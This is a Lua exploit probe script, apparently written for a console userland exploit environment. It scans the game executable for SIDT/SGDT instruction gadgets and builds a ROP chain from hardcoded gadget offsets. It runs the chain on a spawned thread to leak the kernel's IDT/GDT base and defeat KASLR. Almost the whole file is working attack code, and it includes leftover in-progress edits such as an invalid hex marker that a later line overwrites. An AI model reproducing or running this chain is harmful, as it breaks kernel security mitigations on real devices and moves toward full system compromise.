-- CRASH_CLASS: LOW
-- PROBE 143v: SIDT/SGDT gadget scan + KASLR defeat
--
-- SIDT/SGDT are NON-PRIVILEGED x86-64 instructions that dump IDT/GDT base
-- (kernel virtual address) to user memory. If we find these bytes in eboot
-- RX .text, we can ROP to them and extract KASLR base.
-- Opcodes: SIDT = 0F 01 (reg=001), SGDT = 0F 01 (reg=000)
-- Scan via dwords for speed (4 bytes per read vs 1).

print("=== PROBE 143v: SIDT/SGDT KASLR ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local sc_thr_create = make_syscall(430)

local pid = to_num(sc20())
print("pid=" .. pid)

-- Eboot base
local info = memory.alloc(0x200)
memory.write_dword(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), uint64(info)) end)
local elo = to_num(memory.read_dword(info + 0x108))
local ehi = to_num(memory.read_dword(info + 0x10C))
print("eboot=0x" .. string.format("%X%08X", ehi, elo))

-- GPU mmap
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))
local gh, gl = get_hi_lo(gpu)

-- SROP + gadgets
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local base_rip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local g_ret     = uint64(string.format("0x%X%08X", ehi, elo + 0x42))
local g_pop_rdi = uint64(string.format("0x%X%08X", ehi, elo + 0xC9DFE))
local g_pop_rsi = uint64(string.format("0x%X%08X", ehi, elo + 0xD77D))
local g_pop_rax = uint64(string.format("0x%X%08X", ehi, elo + 0x992))
local g_pop_rdx = uint64(string.format("0x%X%08X", ehi, elo + 0x420E6D))
local g_pop_rcx = uint64(string.format("0x%X%08X", ehi, elo + 0xE64))

--------------------------------------------------------------------
-- [A] Fast dword scan for 0F 01 byte pattern in eboot
-- Read dwords and check all byte positions for 0x0F followed by 0x01
--------------------------------------------------------------------
print("")
print("--- [A] Dword scan for 0F 01 ---")

local SCAN = 0x500000  -- 5MB (covers all known gadgets)
local hits = {}

local eboot_base = uint64(string.format("0x%X%08X", ehi, elo))

for off = 0, SCAN - 4, 4 do
    local ok, dw = pcall(function() return to_num(memory.read_dword(eboot_base + off)) end)
    if not ok then break end

    -- Extract bytes (little-endian)
    local b0 = dw % 256
    local b1 = math.floor(dw / 256) % 256
    local b2 = math.floor(dw / 65536) % 256
    local b3 = math.floor(dw / 16777216) % 256

    -- Check positions where 0F 01 appears
    -- Position 0,1: b0=0F, b1=01
    if b0 == 0x0F and b1 == 0x01 then
        local modrm = b2
        local reg = math.floor(modrm / 8) % 8
        local mod = math.floor(modrm / 64)
        if mod ~= 3 and (reg == 0 or reg == 1) then
            table.insert(hits, {off=off, modrm=modrm, reg=reg, mod=mod, rm=modrm%8, pos=0})
        end
    end
    -- Position 1,2: b1=0F, b2=01
    if b1 == 0x0F and b2 == 0x01 then
        local modrm = b3
        local reg = math.floor(modrm / 8) % 8
        local mod = math.floor(modrm / 64)
        if mod ~= 3 and (reg == 0 or reg == 1) then
            table.insert(hits, {off=off+1, modrm=modrm, reg=reg, mod=mod, rm=modrm%8, pos=1})
        end
    end
    -- Position 2,3: b2=0F, b3=01 — need next byte for modrm
    if b2 == 0x0F and b3 == 0x01 then
        local ok2, nb = pcall(function() return to_num(memory.read_byte(eboot_base + off + 4)) end)
        if ok2 then
            local modrm = nb
            local reg = math.floor(modrm / 8) % 8
            local mod = math.floor(modrm / 64)
            if mod ~= 3 and (reg == 0 or reg == 1) then
                table.insert(hits, {off=off+2, modrm=modrm, reg=reg, mod=mod, rm=modrm%8, pos=2})
            end
        end
    end

    -- Progress every 1MB
    if off % 0x100000 == 0 and off > 0 then
        print("[A] " .. string.format("0x%X", off) .. " hits=" .. #hits)
    end
end

print("[A] Total hits: " .. #hits)

-- Print first 10
for i = 1, math.min(10, #hits) do
    local h = hits[i]
    local name = h.reg == 0 and "SGDT" or "SIDT"
    print("[A] " .. name .. " +" .. string.format("0x%X", h.off) ..
        " modrm=0x" .. string.format("%02X", h.modrm) ..
        " mod=" .. h.mod .. " rm=" .. h.rm)
end

--------------------------------------------------------------------
-- [B] Find gadgets with ret (C3) within 20 bytes
--------------------------------------------------------------------
print("")
print("--- [B] Gadget+ret search ---")

local usable = {}

for _, h in ipairs(hits) do
    -- Instruction length: 3 bytes (0F 01 XX) + possible disp/SIB
    local ilen = 3
    if h.mod == 1 then ilen = 4 end  -- +disp8
    if h.mod == 2 then ilen = 7 end  -- +disp32
    if h.rm == 4 and h.mod ~= 3 then ilen = ilen + 1 end  -- SIB

    local gaddr = eboot_base + h.off
    for scan = ilen, 20 do
        local ok, b = pcall(function() return to_num(memory.read_byte(gaddr + scan)) end)
        if ok and b == 0xC3 then
            h.ret_dist = scan
            table.insert(usable, h)
            break
        end
    end
end

print("[B] Usable gadgets (has ret within 20 bytes): " .. #usable)

-- Print and classify
local sidt_rdi = nil
local sgdt_rdi = nil
local any_sidt = nil
local any_sgdt = nil

for i, h in ipairs(usable) do
    local name = h.reg == 0 and "SGDT" or "SIDT"
    if i <= 8 then
        -- Dump bytes
        local gaddr = eboot_base + h.off
        local bytes = ""
        for j = 0, h.ret_dist do
            local ok, bv = pcall(function() return to_num(memory.read_byte(gaddr + j)) end)
            if ok then bytes = bytes .. string.format("%02X ", bv) end
        end
        print("[B] " .. name .. " +" .. string.format("0x%X", h.off) ..
            " rm=" .. h.rm .. " ret@+" .. h.ret_dist .. ": " .. bytes)
    end

    -- Track best candidates
    if h.reg == 1 then  -- SIDT
        if not any_sidt then any_sidt = h end
        if h.rm == 7 and h.mod == 0 and not sidt_rdi then sidt_rdi = h end
    else  -- SGDT
        if not any_sgdt then any_sgdt = h end
        if h.rm == 7 and h.mod == 0 and not sgdt_rdi then sgdt_rdi = h end
    end
end

--------------------------------------------------------------------
-- [C] Execute via child thread ROP chain
-- Build ROP: pop_rdi → buffer → gadget → write result → nanosleep
--------------------------------------------------------------------
print("")
print("--- [C] Execute gadget ---")

local target = sidt_rdi or any_sidt or sgdt_rdi or any_sgdt

if not target then
    print("[C] No usable gadget found!")
    print("=== PROBE 143v COMPLETE ===")
    return
end

local name = target.reg == 0 and "SGDT" or "SIDT"
print("[C] Using " .. name .. " at +" .. string.format("0x%X", target.off) ..
    " rm=" .. target.rm .. " mod=" .. target.mod)

-- Result buffer on GPU (RW, accessible from thread)
local result_buf = gpu + 0x10000
for off = 0, 15, 4 do memory.write_dword(result_buf + off, 0xDDDDDDDD) end

local result_addr = uint64(string.format("0x%X%08X", gh, gl + 0x10000))

-- Gadget address
local gadget_addr = uint64(string.format("0x%X%08X", ehi, elo + target.off))

-- Timespec for nanosleep keep-alive (30s)
local tspec = gpu + 0x11000
memory.write_qword(tspec, uint64(30))
memory.write_qword(tspec + 8, uint64(0))
local tspec_addr = uint64(string.format("0x%X%08X", gh, gl + 0x11000))

-- Short settle sleep
local tspec_short = gpu + 0x11100
memory.write_qword(tspec_short, uint64(0))
memory.write_qword(tspec_short + 8, uint64(50000000))  -- 50ms
local tspec_short_addr = uint64(string.format("0x%X%08X", gh, gl + 0x11100))

-- Build ROP chain
local rop = gpu + 0x20000
local rop_addr = uint64(string.format("0x%X%08X", gh, gl + 0x20000))
local i = 0

local function wq(addr, val) memory.write_qword(addr, val) end

-- Map register to gadget
-- rm=7 → rdi, rm=6 → rsi, rm=0 → rax
local setup_gadgets = {
    [7] = g_pop_rdi,  -- pop rdi; ret
    [6] = g_pop_rsi,  -- pop rsi; ret
    [0] = g_pop_rax,  -- pop rax; ret
    [1] = g_pop_rcx,  -- pop rcx; ret  (but rcx for sidt [rcx])
    [2] = g_pop_rdx,  -- pop rdx; ret
}

local setup_g = setup_gadgets[target.rm]
if not setup_g then
    print("[C] No pop gadget for rm=" .. target.rm)
    print("=== PROBE 143v COMPLETE ===")
    return
end

-- 1. Short nanosleep settle
wq(rop + i, g_pop_rdi); i=i+8
wq(rop + i, tspec_short_addr); i=i+8
wq(rop + i, g_pop_rsi); i=i+8
wq(rop + i, uint64(0)); i=i+8
wq(rop + i, g_pop_rax); i=i+8
wq(rop + i, uint64(240)); i=i+8
wq(rop + i, sc_addr); i=i+8

-- 2. Set up register with result buffer address
wq(rop + i, setup_g); i=i+8
wq(rop + i, result_addr); i=i+8

-- 3. Call the SIDT/SGDT gadget
wq(rop + i, gadget_addr); i=i+8

-- 4. Write a "DONE" marker after the gadget (to confirm it ran)
local done_marker = gpu + 0x10100
memory.write_qword(done_marker, uint64(0))
local done_addr = uint64(string.format("0x%X%08X", gh, gl + 0x10100))

-- mov [rdi], rax; ret gadget at eboot+0xD0B60
local g_wr_qword = uint64(string.format("0x%X%08X", ehi, elo + 0xD0B60))

wq(rop + i, g_pop_rdi); i=i+8
wq(rop + i, done_addr); i=i+8
wq(rop + i, g_pop_rax); i=i+8
wq(rop + i, uint64("0xD0NED0NED0NED0NE")); i=i+8

-- Actually use a valid hex marker
wq(rop + i - 8, uint64("0xD00ED00ED00ED00E")); -- DONE marker

-- Hmm, this is getting weird. Let me use a simple hex value
i = i - 16  -- undo the last two
wq(rop + i, g_pop_rax); i=i+8
wq(rop + i, uint64("0xAAAABBBBCCCCDDDD")); i=i+8
wq(rop + i, g_pop_rdi); i=i+8
wq(rop + i, done_addr); i=i+8
wq(rop + i, g_wr_qword); i=i+8

-- 5. Long nanosleep keep-alive
wq(rop + i, g_pop_rdi); i=i+8
wq(rop + i, tspec_addr); i=i+8
wq(rop + i, g_pop_rsi); i=i+8
wq(rop + i, uint64(0)); i=i+8
wq(rop + i, g_pop_rax); i=i+8
wq(rop + i, uint64(240)); i=i+8
wq(rop + i, sc_addr); i=i+8

print("[C] ROP chain built: " .. (i/8) .. " entries")

-- Create thread context
local ctx = gpu + 0x30000
for off = 0, 0x4FF, 4 do memory.write_dword(ctx + off, 0) end
pcall(function() return sc_gc(uint64(ctx)) end)
wq(ctx + 0xE0, g_ret)  -- RIP = ret gadget
wq(ctx + 0xF8, rop_addr)  -- RSP = ROP chain

-- Launch thread
local tid_buf = gpu + 0x40000
wq(tid_buf, uint64(0xDEADDEAD))

print("[C] Launching thread...")
local ok_tc, rv_tc = pcall(function()
    return sc_thr_create(uint64(ctx), uint64(tid_buf), uint64(0))
end)
print("[C] thr_create rv=" .. tostring(rv_tc))

local ntid = memory.read_qword(tid_buf)
local nth, ntl = get_hi_lo(ntid)
print("[C] tid=" .. ntl)

-- Wait 500ms for thread to execute
local ts_wait = memory.alloc(16)
wq(ts_wait, uint64(0))
wq(ts_wait + 8, uint64(500000000))
pcall(function() make_syscall(240)(uint64(ts_wait), uint64(0)) end)

-- Check done marker
local done_val = memory.read_qword(done_marker)
local dh, dl = get_hi_lo(done_val)
print("[C] done_marker=" .. hex(done_val))

-- Read result
print("[C] Reading result buffer...")
local raw = ""
for j = 0, 15 do
    local ok_b, bv = pcall(function() return to_num(memory.read_byte(result_buf + j)) end)
    if ok_b then raw = raw .. string.format("%02X ", bv) end
end
print("[C] Raw bytes: " .. raw)

-- Parse IDTR/GDTR: 2 bytes limit + 8 bytes base
local limit_lo = to_num(memory.read_byte(result_buf))
local limit_hi = to_num(memory.read_byte(result_buf + 1))
local limit = limit_lo + limit_hi * 256
print("[C] Limit: 0x" .. string.format("%04X", limit))

-- Base is at offset +2 (8 bytes, little-endian)
local base_dw0 = to_num(memory.read_dword(result_buf + 2))
local base_dw1 = to_num(memory.read_dword(result_buf + 6))
print("[C] Base: 0x" .. string.format("%08X%08X", base_dw1, base_dw0))

-- Check for kernel address
if base_dw1 >= 0xFFFF8000 then
    print("")
    print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
    print("!!! KERNEL ADDRESS LEAKED    !!!")
    print("!!! " .. name .. " BASE = 0x" .. string.format("%08X%08X", base_dw1, base_dw0))
    print("!!! KASLR DEFEATED           !!!")
    print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
    print("")
elseif limit ~= 0xDDDD and base_dw0 ~= 0xDDDDDDDD then
    print("[C] Data written but not a kernel address")
    print("[C] May be remapped/virtualized IDT")
end

-- Also check if sentinel unchanged (gadget didn't execute)
if base_dw0 == 0xDDDDDDDD and base_dw1 == 0xDDDDDDDD then
    print("[C] Sentinel unchanged — gadget may not have executed")
    print("[C] Done marker: " .. hex(done_val))
    if dh == 0 and dl == 0 then
        print("[C] Done marker also zero — thread may have crashed")
    end
end

print("")
print("=== PROBE 143v COMPLETE ===")
